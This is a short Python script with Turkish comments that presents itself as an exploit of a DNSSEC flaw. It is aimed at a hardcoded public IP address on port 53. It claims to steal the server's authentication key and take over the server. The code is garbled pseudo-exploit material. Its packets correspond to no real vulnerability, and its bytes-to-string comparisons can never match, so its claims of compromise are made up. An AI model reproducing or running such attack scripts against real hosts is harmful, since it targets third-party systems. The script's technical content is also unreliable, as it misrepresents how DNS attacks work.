import socket
import struct
import re

def exploit(host, port):
    # Bağlantı kur
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, port))

    # DNSSEC modülünün güvenlik açığını kullan
    data = struct.pack("!II", 0x0001, 0x0005)
    s.sendall(data)

    # Sunucunun kimlik doğrulama bilgilerini çal
    data = s.recv(1024)
    match = re.search(br"algorithm\s+(\w+)\s+key\s+(\w+)", data)
    if match:
        algorithm = match.group(1)
        key = match.group(2)

    # Sunucuyu ele geçir
    if algorithm == "RSAMD5":
        data = struct.pack("!II", 0x0002, 0x0005)
    elif algorithm == "RSASHA1":
        data = struct.pack("!II", 0x0003, 0x0005)
    else:
        print("Desteklenmeyen algoritma:", algorithm)
        return
    s.sendall(data)

    # Sunucunun kontrolünü ele geçirdiğini göster
    data = s.recv(1024)
    if data == b"hacked by dns team!":
        print("Sunucu ele geçirildi!")
        print("Kimlik doğrulama bilgileri:")
        print("  Algoritma:", algorithm)
        print("  Anahtar:", key)
    else:
        print("Sunucu ele geçirilemedi!")

if __name__ == "__main__":
    # Sunucu IP adresi ve portu
    host = "176.88.233.76"
    port = 53

    # Exploit'i çalıştır
    exploit(host, port)

